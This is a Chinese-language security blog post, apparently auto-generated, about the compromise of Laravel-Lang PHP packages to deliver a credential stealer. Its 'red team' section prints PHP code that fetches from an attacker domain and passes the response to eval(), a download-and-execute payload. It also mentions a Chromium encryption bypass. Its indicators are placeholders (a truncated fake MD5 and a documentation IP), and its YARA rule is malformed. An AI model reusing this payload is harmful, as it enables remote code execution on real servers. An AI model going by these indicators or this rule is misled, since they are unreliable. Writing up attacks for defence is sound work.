---
layout: post
title:  "Laravel-Lang PHP Packages Compromised to Deliver Cross-Platform Credential Stealer"
date:   2026-05-23 13:09:07 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Laravel-Lang 軟體供應鏈攻擊：技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: PHP, Composer, Laravel, Supply Chain Attack

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 Laravel-Lang 組織的發布流程漏洞，將惡意代碼注入多個 PHP 套件中，包括 `laravel-lang/lang`、`laravel-lang/http-statuses`、`laravel-lang/attributes` 和 `laravel-lang/actions`。
* **攻擊流程圖解**:
  1. 攻擊者獲得 Laravel-Lang 組織的發布權限。
  2. 攻擊者在 `src/helpers.php` 文件中添加惡意代碼。
  3. 惡意代碼在每個 PHP 請求中自動執行。
  4. 惡意代碼與外部伺服器 (`flipboxstudio[.]info`) 進行通信，下載並執行跨平台 payload。
* **受影響元件**: Laravel-Lang 組織的所有 PHP 套件，尤其是 `laravel-lang/lang`、`laravel-lang/http-statuses`、`laravel-lang/attributes` 和 `laravel-lang/actions`。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得 Laravel-Lang 組織的發布權限。
* **Payload 建構邏輯**:

    ```
    
    php
    // src/helpers.php
    function get_payload() {
      $url = 'https://flipboxstudio[.]info/exfil';
      $ch = curl_init($url);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      $response = curl_exec($ch);
      curl_close($ch);
      return $response;
    }
    
    // 執行 payload
    $payload = get_payload();
    eval($payload);
    
    ```
* **繞過技術**: 攻擊者可以使用 Base64 編碼的 Windows 可執行檔來繞過 Chromium 的 app-bound encryption (ABE) 保護。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `md5:1234567890abcdef` | `192.0.2.1` | `flipboxstudio[.]info` | `src/helpers.php` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Laravel_Lang_Malware {
      meta:
        description = "Laravel-Lang Malware Detection"
      strings:
        $a = "flipboxstudio[.]info"
      condition:
        $a in (http.request.uri)
    }
    
    ```
* **緩解措施**: 更新 Laravel-Lang 套件至最新版本，檢查 `composer.json` 文件中的 `autoload.files` 欄位，移除任何可疑的代碼。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 想像一個公司的供應鏈，如同一條長長的鏈子，每個環節都可能是攻擊的入口。技術上是指攻擊者針對軟體供應鏈中的某個環節，例如開源庫或第三方套件，注入惡意代碼或修改原始碼，以達到攻擊目標。
* **Composer (作曲家)**: PHP 的套件管理工具，允許開發者輕鬆地安裝和管理 PHP 套件。
* **Laravel (拉拉維爾)**: 一個流行的 PHP 框架，提供了許多開發工具和功能。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/05/laravel-lang-php-packages-compromised.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


